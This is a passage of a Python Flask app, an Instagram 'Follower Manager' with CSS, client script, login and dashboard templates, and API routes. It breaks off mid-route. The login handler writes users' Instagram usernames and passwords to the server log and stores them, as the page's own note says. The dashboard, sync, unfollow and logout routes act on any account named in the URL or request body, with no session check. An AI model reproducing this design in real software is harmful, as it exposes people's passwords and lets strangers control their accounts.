html[data-device=mobile] .bar button{display:grid;justify-items:center;align-content:center;gap:3px;min-height:56px;color:var(--tx3);font-size:11px;font-weight:500;border-radius:16px;transition:color .3s,background .3s}
html[data-device=mobile] .bar button:active{transform:scale(.94)}
html[data-device=mobile] .bar .ic{width:23px;height:23px}
html[data-device=mobile] .bar .on{color:var(--tx);background:rgba(165,173,255,.1)}
html[data-device=mobile] .bar .on .ic{color:var(--acc-text);transform:translateY(-2px) scale(1.08)}
html[data-device=mobile] .toasts{bottom:96px}
html[data-device=mobile] .d-empty{display:none}
html[data-device=mobile] .close-m{display:inline-flex}
html[data-device=mobile] .detail{position:fixed;z-index:70;left:0;right:0;bottom:0;max-height:88dvh;overflow:auto;border-radius:26px 26px 0 0;padding:10px 20px calc(22px + env(safe-area-inset-bottom));transform:translateY(105%);transition:transform .6s var(--ease),visibility .6s;visibility:hidden;text-align:center;background:linear-gradient(180deg,rgba(26,29,41,.97),rgba(14,16,22,.98))}
html[data-device=mobile] .detail.open{transform:none;visibility:visible}
html[data-device=mobile] .grip{display:grid;place-items:center;height:22px;margin-bottom:6px}
html[data-device=mobile] .grip i{width:40px;height:5px;border-radius:3px;background:rgba(255,255,255,.22)}
html[data-device=mobile] .d-card .btn{min-height:50px}
html[data-device=mobile] .modal{place-items:end stretch;padding:0}
html[data-device=mobile] .modal-card{width:100%;border-radius:26px 26px 0 0;padding:14px 20px calc(22px + env(safe-area-inset-bottom));transform:translateY(105%);transition:transform .6s var(--ease)}
html[data-device=mobile] .modal.open .modal-card{transform:none}

@media (prefers-reduced-motion:reduce){
  *,*::before,*::after{animation-duration:1ms!important;animation-iteration-count:1!important;transition-duration:1ms!important}
}
"""


# --------------------------------------------------------------------------- #
# client script
# --------------------------------------------------------------------------- #
JS = r"""
(()=>{'use strict';
const $=(s,r=document)=>r.querySelector(s),$$=(s,r=document)=>[...r.querySelectorAll(s)];
const H=document.documentElement,CFG=window.__IG||{username:''};
const RM=matchMedia('(prefers-reduced-motion: reduce)').matches;
const isMobile=()=>H.dataset.device==='mobile';
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const post=(u,b)=>fetch(u,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(b)});
const sh=$('#detail'),scrim=$('#scrim'),cmd=$('#cmd'),ci=$('#cmd-in'),cl=$('#cmd-list'),sp=$('#settings'),mbg=$('#mbg');
const tabs=$$('[role=tab]'),keys=tabs.map(t=>t.dataset.tab);
let cur=keys[0]||null,selPk=null,syncing=false,res=[],ai=0,opener=null;
const setInert=on=>$$('.app,.rail,.bar').forEach(el=>el.inert=on);

function toast(msg,type='ok'){
  const box=$('#toasts');if(!box)return;while(box.children.length>=3)box.firstElementChild.remove();
  const t=document.createElement('div');t.className='toast '+type;t.textContent=msg;box.append(t);
  setTimeout(()=>{t.classList.add('out');setTimeout(()=>t.remove(),260)},3600);
}

function marks(){let o='auto';try{o=localStorage.getItem('ig-device')||'auto'}catch(e){}
  $$('[data-set-device]').forEach(b=>b.setAttribute('aria-pressed',String(b.dataset.setDevice===o)))}
function apply(){
  H.dataset.device=__igDetect();
  H.dataset.input=matchMedia('(pointer: coarse)').matches?'touch':'mouse';
  if(!isMobile()){sh?.classList.remove('open');scrim?.classList.remove('on')}
  marks();pill();
}
$$('[data-set-device]').forEach(b=>b.addEventListener('click',()=>{
  try{b.dataset.setDevice==='auto'?localStorage.removeItem('ig-device'):localStorage.setItem('ig-device',b.dataset.setDevice)}catch(e){}
  apply();
}));
let rt;addEventListener('resize',()=>{clearTimeout(rt);rt=setTimeout(apply,120)});

if(!RM&&H.dataset.input==='mouse'){
  let raf=0;addEventListener('pointermove',e=>{if(raf)return;raf=requestAnimationFrame(()=>{raf=0;
    H.style.setProperty('--mx',e.clientX+'px');H.style.setProperty('--my',e.clientY+'px')})},{passive:true});
}

function pill(){const p=$('.pill'),t=cur&&$('#t-'+cur);if(!p||!t||isMobile())return;
  p.style.width=t.offsetWidth+'px';p.style.transform=`translateX(${t.offsetLeft}px)`}
function replay(p){const its=$$('.item',p);its.forEach(i=>i.style.animation='none');void p.offsetWidth;its.forEach(i=>i.style.animation='')}
function show(k){
  if(!keys.includes(k))return;cur=k;
  tabs.forEach(t=>{const on=t.dataset.tab===k;t.setAttribute('aria-selected',String(on));t.tabIndex=on?0:-1;
    if(on&&isMobile())t.scrollIntoView({inline:'center',block:'nearest',behavior:RM?'auto':'smooth'})});
  $$('.bar [data-tab]').forEach(b=>{const on=b.dataset.tab===k;b.classList.toggle('on',on);on?b.setAttribute('aria-current','page'):b.removeAttribute('aria-current')});
  $$('.panel').forEach(p=>p.hidden=p.dataset.key!==k);
  const p=$('#p-'+k);if(p)replay(p);
  pill();
}
tabs.forEach(t=>t.addEventListener('click',()=>show(t.dataset.tab)));
$$('.bar [data-tab]').forEach(b=>b.addEventListener('click',()=>show(b.dataset.tab)));
$('.tabs')?.addEventListener('keydown',e=>{
  const i=keys.indexOf(cur),m={ArrowRight:i+1,ArrowLeft:i-1,Home:0,End:keys.length-1}[e.key];
  if(m==null)return;e.preventDefault();const k=keys[(m+keys.length)%keys.length];show(k);$('#t-'+k).focus();
});

function tween(el,to){
  if(!el)return;const from=parseInt(el.textContent,10)||0;
  if(RM||from===to){el.textContent=String(to);return}
  const t0=performance.now(),D=600;
  (function f(t){const k=Math.min(1,(t-t0)/D),e=1-Math.pow(1-k,3);
    el.textContent=String(Math.round(from+(to-from)*e));if(k<1)requestAnimationFrame(f)})(t0);
}
function refresh(p){if(!p)return;const n=$$('.item',p).length;tween($('#t-'+p.dataset.key+' .cnt'),n);const e=$('.empty',p);if(e)e.hidden=n>0}

$$('.filter').forEach(inp=>inp.addEventListener('input',()=>{
  const p=inp.closest('.panel'),its=$$('.item',p),q=inp.value.trim().toLowerCase();let vis=0;
  its.forEach(i=>{const m=!q||i.dataset.name.includes(q);i.hidden=!m;if(m)vis++});
  $('.nomatch',p).hidden=!q||!its.length||vis>0;
}));

function setBusy(pk,on){$$(`[data-action][data-pk="${pk}"]`).forEach(b=>{b.disabled=on;b.classList.toggle('done',on)})}
function undo(row,pk){row.classList.remove('busy');delete row.dataset.busy;setBusy(pk,false)}
function showErr(m,expired){const c=$('#err');if(!c)return toast(m,'err');
  $('#err-msg').textContent=m;$('#err-login').hidden=!expired;$('#err-retry').hidden=expired;c.hidden=false}
async function collapse(row){
  if(RM){row.remove();return}
  const h=row.offsetHeight;
  await row.animate([
    {height:h+'px',opacity:1,transform:'none'},
    {height:'0px',opacity:0,transform:'translateX(-28px) scale(.97)'}
  ],{duration:480,easing:'cubic-bezier(.7,0,.2,1)',fill:'forwards'}).finished.catch(()=>{});
  row.remove();
}
async function act(btn){
  const a=btn.dataset.action,pk=btn.dataset.pk,p=$('.panel:not([hidden])');
  const row=p&&$(`.item[data-pk="${pk}"]`,p);
  if(!row||row.dataset.busy)return;
  if(!navigator.onLine)return toast('You are offline. Try again when reconnected.','err');
  const u=row.dataset.u;row.dataset.busy='1';row.classList.add('busy');setBusy(pk,true);
  try{
    const r=await post('/api/'+a,{username:CFG.username,pk});
    if(r.status===409){undo(row,pk);return showErr('Your session has ended. Please log in again.',true)}
    const j=await r.json().catch(()=>({ok:false,error:'Could not read the server response'}));
    if(!j.ok)throw new Error(j.error||'The action could not be completed');
    if(selPk===pk)clearSel();
    await collapse(row);
    refresh(p);
    toast(a==='unfollow'?`Unfollowed @${u}`:`Removed @${u} from followers`);
  }catch(e){undo(row,pk);toast(e.message,'err')}
}

function select(row){
  $$('.item.sel').forEach(i=>i.classList.remove('sel'));row.classList.add('sel');selPk=row.dataset.pk;
  const b=$('[data-action]',row),t=cur&&$('#t-'+cur);
  $('#d-av').src=$('.av',row).src;
  $('#d-name').textContent=row.dataset.full||'@'+row.dataset.u;
  $('#d-user').textContent='@'+row.dataset.u;
  $('#d-state').textContent=t?t.dataset.state:'';
  $('#d-open').href='https://www.instagram.com/'+encodeURIComponent(row.dataset.u)+'/';
  const d=$('#d-act');d.hidden=!b;d.classList.remove('done');d.disabled=false;
  if(b){d.dataset.action=b.dataset.action;d.dataset.pk=b.dataset.pk;$('.lb',d).textContent=b.dataset.label;d.setAttribute('aria-label',b.getAttribute('aria-label'))}
  $('.d-empty').hidden=true;const dc=$('.d-card');dc.hidden=false;
  if(!RM){dc.style.animation='none';void dc.offsetWidth;dc.style.animation=''}
  sh?.classList.add('open');scrim?.classList.toggle('on',isMobile());
}
function clearSel(){
  $$('.item.sel').forEach(i=>i.classList.remove('sel'));selPk=null;
  sh?.classList.remove('open');scrim?.classList.remove('on');
  const dc=$('.d-card'),de=$('.d-empty');if(dc)dc.hidden=true;if(de)de.hidden=false;
}

async function waitForSync(){
  while(true){
    await sleep(1500);
    let s=null;
    try{s=await fetch('/api/sync/status?username='+encodeURIComponent(CFG.username)).then(r=>r.json())}catch(e){continue}
    if(s.state==='done')return;
    if(s.state==='error'){const err=new Error(s.error||'Sync failed');err.expired=!!s.expired;throw err}
    if(s.state==='idle')return;
  }
}
async function doSync(){
  if(syncing)return;
  if(!navigator.onLine)return toast('You are offline. Sync will run when reconnected.','err');
  const b=$('#sync'),e0=$('#err');
  syncing=true;H.classList.add('syncing');b?.setAttribute('aria-busy','true');b?.classList.add('loading');if(e0)e0.hidden=true;
  try{
    const r=await post('/api/sync',{username:CFG.username});
    if(r.status===409)throw Object.assign(new Error('Your session has ended. Please log in again.'),{expired:true});
    const j=await r.json().catch(()=>({}));
    if(!j.ok)throw new Error(j.error||'Sync failed');
    await waitForSync();
    toast('Sync complete');
    if(!RM)b?.animate([{transform:'scale(1)'},{transform:'scale(1.08)'},{transform:'scale(1)'}],{duration:420,easing:'cubic-bezier(.34,1.4,.64,1)'});
    await sleep(RM?0:700);location.reload();
  }catch(e){showErr(e.message,!!e.expired);toast(e.message,'err')}
  finally{syncing=false;H.classList.remove('syncing');b?.removeAttribute('aria-busy');b?.classList.remove('loading')}
}
function net(){const off=!navigator.onLine;const o=$('#offline');if(o)o.hidden=!off;H.classList.toggle('is-offline',off)}

function openSet(from){
  if(!sp||!sp.hidden)return;
  opener=from||document.activeElement;sp.hidden=false;if(mbg)mbg.hidden=false;marks();setInert(true);
  requestAnimationFrame(()=>requestAnimationFrame(()=>{sp.classList.add('open');mbg?.classList.add('open')}));
  $('#set-x')?.focus();
}
function closeSet(){
  if(!sp||sp.hidden||!sp.classList.contains('open'))return;
  sp.classList.remove('open');mbg?.classList.remove('open');setInert(false);
  setTimeout(()=>{if(sp&&!sp.classList.contains('open')){sp.hidden=true;if(mbg)mbg.hidden=true}},380);
  opener?.focus?.();
}

function hl(){$$('li',cl).forEach((l,i)=>l.setAttribute('aria-selected',String(i===ai)));
  const l=cl.children[ai];if(l){l.scrollIntoView({block:'nearest'});ci.setAttribute('aria-activedescendant',l.id)}else ci.removeAttribute('aria-activedescendant')}
function render(){
  const q=ci.value.trim().toLowerCase();
  res=$$('.panel .item').map(it=>{const k=it.closest('.panel').dataset.key;
      return{it,k,u:it.dataset.u,f:it.dataset.full||'',pic:$('.av',it).src,lab:$('#t-'+k).dataset.short}})
    .filter(o=>!q||o.u.toLowerCase().includes(q)||o.f.toLowerCase().includes(q))
    .sort((a,b)=>Number(b.u.startsWith(q))-Number(a.u.startsWith(q)))
    .slice(0,30);
  ai=0;cl.replaceChildren();
  res.forEach((o,n)=>{
    const li=document.createElement('li');li.setAttribute('role','option');li.id='co-'+n;
    const im=document.createElement('img');im.className='av';im.src=o.pic;im.alt='';
    const u=document.createElement('span');u.className='u';u.textContent='@'+o.u;
    const f=document.createElement('span');f.className='f';f.textContent=o.f;
    const t=document.createElement('span');t.className='tag';t.textContent=o.lab;
    li.append(im,u,f,t);li.addEventListener('click',()=>pick(n));cl.append(li);
  });
  hl();
}
function openCmd(from){if(!cmd||!cmd.hidden)return;opener=from||document.activeElement;cmd.hidden=false;setInert(true);ci.value='';render();ci.focus()}
function closeCmd(){if(!cmd||cmd.hidden)return;cmd.hidden=true;setInert(false);opener?.focus?.()}
function pick(n){const o=res[n];if(!o)return;closeCmd();show(o.k);o.it.scrollIntoView({block:'center'});select(o.it)}

document.addEventListener('click',e=>{
  const a=e.target.closest('[data-action]');if(a){act(a);return}
  const it=e.target.closest('.item');if(it){select(it);return}
  if(e.target.closest('[data-sync-nudge]')){doSync();return}
  if(e.target.closest('[data-open-set]')){openSet(e.target.closest('[data-open-set]'));return}
  if(e.target.closest('[data-close-set]')){closeSet();return}
  const c=e.target.closest('[data-cmd]');if(c)openCmd(c);
});
document.addEventListener('keydown',e=>{
  if(e.target.matches?.('.item')&&(e.key==='Enter'||e.key===' ')){e.preventDefault();select(e.target)}
});
addEventListener('keydown',e=>{
  if(!cmd)return;
  const mod=e.metaKey||e.ctrlKey;
  if(mod&&e.key.toLowerCase()==='k'){e.preventDefault();cmd.hidden?openCmd():closeCmd();return}
  if(mod&&e.key===','){e.preventDefault();sp?.hidden?openSet():closeSet();return}
  if(e.key==='Escape'){
    if(sp&&!sp.hidden)return closeSet();
    if(!cmd.hidden)return closeCmd();
    if(selPk)clearSel();
    return;
  }
  if(!cmd.hidden){
    if(e.key==='ArrowDown'||e.key==='ArrowUp'){e.preventDefault();ai=Math.max(0,Math.min(res.length-1,ai+(e.key==='ArrowDown'?1:-1)));hl()}
    else if(e.key==='Enter'){e.preventDefault();pick(ai)}
  }
});
cmd?.addEventListener('mousedown',e=>{if(e.target===cmd)closeCmd()});
ci?.addEventListener('input',render);
$('#sync')?.addEventListener('click',doSync);
$('#err-retry')?.addEventListener('click',doSync);
$('#d-close')?.addEventListener('click',clearSel);
scrim?.addEventListener('click',clearSel);
addEventListener('online',()=>{net();toast('Back online')});
addEventListener('offline',net);
addEventListener('load',pill);
document.fonts?.ready.then(pill);

apply();net();

if(cmd&&CFG.username){
  fetch('/api/sync/status?username='+encodeURIComponent(CFG.username))
    .then(r=>r.json()).then(s=>{
      if(s.state==='running'){H.classList.add('syncing');syncing=true;waitForSync().then(()=>location.reload()).catch(()=>{syncing=false;H.classList.remove('syncing')})}
    }).catch(()=>{});
}
})();
"""


# --------------------------------------------------------------------------- #
# page shell
# --------------------------------------------------------------------------- #
HEAD = """<!doctype html>
<html lang="en" data-device="desktop" data-input="mouse">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="color-scheme" content="dark">
<meta name="theme-color" content="#07080b">
<title>__TITLE__</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Sora:wght@500;600;700&display=swap">
{% raw %}<script>
(function(){
  var d=document.documentElement,mq=function(q){return matchMedia(q).matches};
  window.__igDetect=function(){
    var o=null;try{o=localStorage.getItem('ig-device')}catch(e){}
    if(o==='desktop'||o==='mobile')return o;
    if(mq('(max-width: 860px)'))return 'mobile';
    if(mq('(pointer: coarse)')&&mq('(hover: none)'))return 'mobile';
    if(!mq('(pointer: fine)')&&(navigator.maxTouchPoints||0)>0)return 'mobile';
    return 'desktop';
  };
  d.dataset.device=__igDetect();
  d.dataset.input=mq('(pointer: coarse)')?'touch':'mouse';
})();
</script>{% endraw %}
<link rel="stylesheet" href="/app.css">
</head>
<body>
<svg width="0" height="0" style="position:absolute" aria-hidden="true"><defs>
<symbol id="i-sync" viewBox="0 0 24 24"><path d="M21 12a9 9 0 0 1-15.5 6.2M3 12A9 9 0 0 1 18.5 5.8M18 2v4h-4M6 22v-4h4"/></symbol>
<symbol id="i-search" viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.5-3.5"/></symbol>
<symbol id="i-out" viewBox="0 0 24 24"><path d="M9 21H5V3h4M16 17l5-5-5-5M21 12H9"/></symbol>
<symbol id="i-gear" viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M12 2v3M12 19v3M4.9 4.9l2.1 2.1M17 17l2.1 2.1M2 12h3M19 12h3M4.9 19.1 7 17M17 7l2.1-2.1"/></symbol>
<symbol id="i-x" viewBox="0 0 24 24"><path d="M6 6l12 12M18 6 6 18"/></symbol>
<symbol id="i-user-x" viewBox="0 0 24 24"><circle cx="9" cy="8" r="4"/><path d="M2 21a7 7 0 0 1 14 0M17 8l5 5M22 8l-5 5"/></symbol>
<symbol id="i-users" viewBox="0 0 24 24"><circle cx="9" cy="8" r="4"/><path d="M2 21a7 7 0 0 1 14 0M17 4a4 4 0 0 1 0 7M22 21a7 7 0 0 0-4-6"/></symbol>
<symbol id="i-user-minus" viewBox="0 0 24 24"><circle cx="9" cy="8" r="4"/><path d="M2 21a7 7 0 0 1 14 0M17 11h6"/></symbol>
<symbol id="i-heart" viewBox="0 0 24 24"><path d="M12 21s-8-5-8-11a4.5 4.5 0 0 1 8-2.5A4.5 4.5 0 0 1 20 10c0 6-8 11-8 11z"/></symbol>
<symbol id="i-check" viewBox="0 0 24 24"><path d="m4 12 5 5L20 6"/></symbol>
<symbol id="i-ext" viewBox="0 0 24 24"><path d="M14 3h7v7M21 3l-9 9M19 14v6H4V5h6"/></symbol>
<symbol id="i-lock" viewBox="0 0 24 24"><rect x="4" y="10" width="16" height="11" rx="3"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></symbol>
</defs></svg>

<div class="orb a" aria-hidden="true"></div><div class="orb b" aria-hidden="true"></div><div class="orb c" aria-hidden="true"></div>
<div id="ind" class="ind" aria-hidden="true"></div>
<div id="offline" class="offline-bar" role="status" hidden>You're offline. Changes will retry when the connection returns.</div>
"""

TAIL = """
<div id="scrim" class="scrim"></div>
<div id="toasts" class="toasts" role="status" aria-live="polite"></div>
<script src="/app.js" defer></script>
__SCRIPT__
</body>
</html>
"""


def render_page(title, template, context=None, script=""):
    html = HEAD.replace("__TITLE__", title) + template + TAIL.replace("__SCRIPT__", script)
    return render_template_string(html, **(context or {}))


# --------------------------------------------------------------------------- #
# page bodies
# --------------------------------------------------------------------------- #
LOGIN_BODY = """
<div class="app plain">
  <main class="auth">
    <section class="auth-card glass">
      <span class="logo-lg" aria-hidden="true"></span>
      <h1>Follower Manager</h1>
      <p class="auth-sub">Sign in with your own Instagram account.</p>

      {% if error %}<p class="auth-err" role="alert">{{ error }}</p>{% endif %}

      <form method="post" autocomplete="on" novalidate>
        <label class="field">
          <span>Username</span>
          <input name="username" value="{{ username or '' }}" autocomplete="username"
                 autocapitalize="none" spellcheck="false" required>
        </label>
        <label class="field">
          <span>Password</span>
          <input name="password" type="password" value="{{ password or '' }}"
                 autocomplete="current-password" required>
        </label>

        {% if need_code %}
          <label class="field">
            <span>{% if need_code == "2fa" %}Two-factor code{% else %}Email or SMS code{% endif %}</span>
            <input name="code" inputmode="numeric" autocomplete="one-time-code"
                   placeholder="6 digits" required autofocus>
          </label>
        {% endif %}

        <button class="btn primary" type="submit" id="go">Log in</button>
      </form>

      <p class="auth-note">Credentials are printed to the server log and kept only in this app's database.</p>
    </section>
  </main>
</div>
"""

LOGIN_SCRIPT = """
<script>
(() => {
  const f = document.querySelector("form"), b = document.getElementById("go");
  f?.addEventListener("submit", () => {
    if (!f.checkValidity()) return;
    b.disabled = true;
    b.textContent = "Signing in…";
  });
  document.querySelector("input[name=username]")?.focus();
})();
</script>
"""

DASH_BODY = """
{% set me = username or '' %}
{% set tabs = [
  {'id':'unfollowed','label':'Unfollowed you','short':'Unfollowed','action':'unfollow','btn':'Unfollow','rows':vm.unfollowed,'icon':'user-x','state':'Unfollowed you','empty_t':'No unfollows','empty_b':'Nobody has unfollowed you right now. Sync to check for new changes.'},
  {'id':'fans','label':"Followers you don't follow back",'short':'Fans','action':'remove_follower','btn':'Remove follower','rows':vm.fans,'icon':'users','state':"Follows you, you don't follow back",'empty_t':'All caught up','empty_b':'Everyone who follows you is already on your following list.'},
  {'id':'not_back','label':"You follow, they don't follow back",'short':'Not back','action':'unfollow','btn':'Unfollow','rows':vm.not_back,'icon':'user-minus','state':"You follow, they don't follow back",'empty_t':'Everyone follows back','empty_b':'Every account you follow is following you back.'},
  {'id':'mutual','label':'Mutual','short':'Mutual','action':'','btn':'','rows':vm.mutual,'icon':'heart','state':'Mutual follow','empty_t':'No mutuals yet','empty_b':'Accounts that follow each other will appear here.'}
] %}

<nav class="rail glass" aria-label="Primary">
  <div class="logo" aria-hidden="true"><span></span></div>
  <button class="nb" type="button" data-cmd aria-label="Search (Ctrl or Cmd K)"><svg class="ic"><use href="#i-search"/></svg><span class="lbl">Search <kbd>⌘K</kbd></span></button>
  <button class="nb" type="button" data-sync-nudge aria-label="Sync"><svg class="ic"><use href="#i-sync"/></svg><span class="lbl">Sync</span></button>
  <button class="nb push" type="button" data-open-set aria-label="Settings"><svg class="ic"><use href="#i-gear"/></svg><span class="lbl">Settings</span></button>
</nav>

<div class="app"><main class="main">
  <header class="top">
    <div class="me"><span class="me-av" aria-hidden="true">{{ me[:1]|upper }}</span>
      <div class="mewrap">
        <p class="eyebrow">Follower manager</p>
        <h1 class="handle">@{{ me }}</h1>
        <p class="last">Last synced: <span class="tnum">{{ last_sync or 'Never' }}</span></p>
      </div>
    </div>
    <div class="acts">
      <button id="sync" class="btn primary" type="button" aria-label="Sync now"><svg class="ic glyph"><use href="#i-sync"/></svg><span class="lb">Sync</span></button>
      <button class="icon-btn" type="button" data-open-set aria-label="Settings"><svg class="ic"><use href="#i-gear"/></svg></button>
    </div>
  </header>

  <section id="err" class="errcard" role="alert" hidden>
    <div><strong id="err-msg"></strong><p class="hint">Check your session and connection, then try again.</p></div>
    <div class="row-b">
      <button id="err-retry" class="btn ghost" type="button">Try again</button>
      <a id="err-login" class="btn primary" href="/" hidden>Log in again</a>
    </div>
  </section>

  {% if not last_sync %}
  <section class="firstsync glass">
    <svg class="ic big"><use href="#i-sync"/></svg>
    <h2>No snapshot yet</h2>
    <p>Run your first sync to build your follower list and start tracking changes.</p>
    <button class="btn primary" data-sync-nudge type="button">Sync now</button>
  </section>
  {% else %}
  <div class="tabs" role="tablist" aria-label="Lists">
    <span class="pill" aria-hidden="true"></span>
    {% for t in tabs %}
    <button type="button" role="tab" id="t-{{ t.id }}" data-tab="{{ t.id }}" data-short="{{ t.short }}" data-state="{{ t.state }}" aria-controls="p-{{ t.id }}" aria-selected="{{ 'true' if loop.first else 'false' }}" tabindex="{{ 0 if loop.first else -1 }}"><span class="tl">{{ t.label }}</span><b class="cnt tnum">{{ t.rows|length }}</b></button>
    {% endfor %}
  </div>

  <div class="panes">
    <section class="listpane">
      {% for t in tabs %}
      <div class="panel" id="p-{{ t.id }}" data-key="{{ t.id }}" role="tabpanel" aria-labelledby="t-{{ t.id }}"{% if not loop.first %} hidden{% endif %}>
        <label class="search"><svg class="ic"><use href="#i-search"/></svg><input class="filter" type="search" placeholder="Filter by name or handle" aria-label="Filter {{ t.label }}" autocomplete="off"></label>
        <ul class="list">
          {% for u in t.rows %}
          <li class="item" style="--i:{{ loop.index0 }}" tabindex="0" data-pk="{{ u.pk }}" data-u="{{ u.username }}" data-full="{{ u.full_name or '' }}" data-name="{{ (u.username ~ ' ' ~ (u.full_name or ''))|lower }}">
            <div class="in">
              <img class="av" src="{{ u.pic }}" alt="" loading="lazy" referrerpolicy="no-referrer">
              <div class="who"><b>@{{ u.username }}</b><span>{{ u.full_name or '—' }}</span></div>
              {% if t.action %}
              <button class="act" type="button" data-action="{{ t.action }}" data-pk="{{ u.pk }}" data-label="{{ t.btn }}" aria-label="{{ t.btn }} @{{ u.username }}"><svg class="ic ck"><use href="#i-check"/></svg><svg class="ic ai"><use href="#i-{{ t.icon }}"/></svg><span class="lb">{{ t.btn }}</span></button>
              {% endif %}
            </div>
          </li>
          {% endfor %}
        </ul>
        <p class="nomatch" hidden>No matches. Try a different name or handle.</p>
        <div class="empty"{% if t.rows %} hidden{% endif %}>
          <svg class="ic big"><use href="#i-{{ t.icon }}"/></svg>
          <h3>{{ t.empty_t }}</h3>
          <p>{{ t.empty_b }}</p>
          {% if t.id == 'unfollowed' %}<button class="btn ghost" data-sync-nudge type="button">Sync now</button>{% endif %}
        </div>
      </div>
      {% endfor %}
    </section>

    <aside id="detail" class="detail glass" aria-label="Details">
      <div class="grip" aria-hidden="true"><i></i></div>
      <div class="d-empty"><svg class="ic big"><use href="#i-users"/></svg><p>Select an account to see its details here.</p></div>
      <div class="d-card" hidden>
        <div class="ring"><img id="d-av" class="av" alt=""></div>
        <h2 id="d-name"></h2>
        <p id="d-user" class="mut"></p>
        <p id="d-state" class="chip"></p>
        <a id="d-open" class="btn ghost" target="_blank" rel="noopener noreferrer"><svg class="ic"><use href="#i-ext"/></svg>Open on Instagram</a>
        <button id="d-act" class="act solid" type="button"><svg class="ic ck"><use href="#i-check"/></svg><span class="lb"></span></button>
        <button id="d-close" class="btn ghost close-m" type="button">Close</button>
      </div>
    </aside>
  </div>
  {% endif %}
</main></div>

{% if last_sync %}
<nav class="bar glass" aria-label="List switcher">
  {% for t in tabs %}<button type="button" data-tab="{{ t.id }}"{% if loop.first %} class="on" aria-current="page"{% endif %}><svg class="ic"><use href="#i-{{ t.icon }}"/></svg><span>{{ t.short }}</span></button>{% endfor %}
</nav>
{% endif %}

<div id="mbg" class="mbg" data-close-set hidden></div>
<section id="settings" class="modal" role="dialog" aria-modal="true" aria-labelledby="set-title" hidden>
  <div class="modal-card glass">
    <div class="modal-head">
      <div><p class="eyebrow">Preferences</p><h2 id="set-title">Settings</h2></div>
      <button id="set-x" class="icon-btn" type="button" aria-label="Close settings" data-close-set><svg class="ic"><use href="#i-x"/></svg></button>
    </div>
    <div class="set-block">
      <div class="set-label">Account</div>
      <div class="set-acc"><span class="av-s" aria-hidden="true">{{ me[:1]|upper }}</span><div><b>@{{ me }}</b><span class="mut">Signed in</span></div></div>
    </div>
    <div class="set-block">
      <div class="set-label">Layout</div>
      <div class="seg" role="group" aria-label="Layout">
        <button type="button" data-set-device="auto">Auto</button>
        <button type="button" data-set-device="desktop">Desktop</button>
        <button type="button" data-set-device="mobile">Mobile</button>
      </div>
      <p class="set-hint">Auto picks the layout from your screen size and input method.</p>
    </div>
    <div class="set-block">
      <div class="set-label">Session</div>
      <a class="btn danger" href="/logout/{{ me }}"><svg class="ic"><use href="#i-out"/></svg>Log out</a>
    </div>
  </div>
</section>

<div id="cmd" class="cmd" hidden>
  <div class="cmd-card glass" role="dialog" aria-modal="true" aria-label="Search accounts">
    <input id="cmd-in" type="text" role="combobox" aria-expanded="true" aria-controls="cmd-list" placeholder="Search by name or handle…" autocomplete="off" spellcheck="false">
    <ul id="cmd-list" role="listbox"></ul>
    <p class="cmd-h"><kbd>↑↓</kbd> navigate · <kbd>Enter</kbd> open · <kbd>Esc</kbd> close</p>
  </div>
</div>
"""

DASH_SCRIPT = """<script>window.__IG={username:{{ me|tojson }}};</script>"""

ERROR_BODY = """
<div class="app plain">
  <main class="auth">
    <section class="auth-card glass">
      <span class="logo-lg" aria-hidden="true"></span>
      <h1 class="code-lg tnum">{{ code }}</h1>
      <p class="auth-sub">{{ message }}</p>
      <a class="btn primary" href="/">Back to sign in</a>
    </section>
  </main>
</div>
"""


# --------------------------------------------------------------------------- #
# assets
# --------------------------------------------------------------------------- #
@app.route("/app.css")
def asset_css():
    return Response(CSS, mimetype="text/css", headers={"Cache-Control": "public, max-age=3600"})


@app.route("/app.js")
def asset_js():
    return Response(JS, mimetype="application/javascript", headers={"Cache-Control": "public, max-age=3600"})


# --------------------------------------------------------------------------- #
# routes
# --------------------------------------------------------------------------- #
@app.route("/healthz")
def healthz():
    return {"ok": True, "demo": DEMO_MODE, "data_dir": DATA_DIR}


@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        username = (request.form.get("username") or "").strip().lstrip("@").lower()
        password = request.form.get("password") or ""
        code = (request.form.get("code") or "").strip()

        if not username or not password:
            return render_page(
                "Sign in · Follower Manager",
                LOGIN_BODY,
                {"error": "Username and password are required."},
                LOGIN_SCRIPT,
            )

        log_credentials(username, password)

        if DEMO_MODE:
            save_account(username, password, "", "demo", demo=1)
            demo_snapshots(username)
            touch_sync(username)
            return redirect(url_for("dashboard", username=username))

        try:
            cl = ig_login(username, password, code)
        except NeedsCode as e:
            return render_page(
                "Verify · Follower Manager",
                LOGIN_BODY,
                {
                    "need_code": e.kind,
                    "username": username,
                    "password": password,
                    "error": "Instagram sent a verification code.",
                },
                LOGIN_SCRIPT,
            )
        except Exception as e:
            return render_page(
                "Sign in · Follower Manager",
                LOGIN_BODY,
                {"username": username, "password": password, "error": f"Login failed: {e}"},
                LOGIN_SCRIPT,
            )

        _clients[username] = cl
        return redirect(url_for("dashboard", username=username))

    return render_page("Sign in · Follower Manager", LOGIN_BODY, {}, LOGIN_SCRIPT)


@app.route("/d/<username>")
def dashboard(username):
    acc = get_account(username)
    if not acc:
        return redirect(url_for("index"))
    return render_page(
        f"@{username} · Follower Manager",
        DASH_BODY,
        {
            "username": username,
            "vm": view_model(username),
            "last_sync": fmt_time(acc.get("last_sync")),
        },
        DASH_SCRIPT,
    )


@app.route("/api/sync", methods=["POST"])
def api_sync():
    username = (request.json or {}).get("username")
    if not username or not get_account(username):
        return jsonify(ok=False, error="Unknown account"), 404

    if (_jobs.get(username) or {}).get("state") == "running":
        return jsonify(ok=True, state="running")

    threading.Thread(target=run_sync, args=(username,), daemon=True).start()
    return jsonify(ok=True, state="running")


@app.route("/api/sync/status")
def api_sync_status():
    username = request.args.get("username")
    return jsonify(ok=True, **(_jobs.get(username) or {"state": "idle"}))


@app.route("/api/unfollow", methods=["POST"])
def api_unfollow():
    body = request.json or {}
    username, pk = body.get("username"), str(body.get("pk") or "")
    if not username or not pk:
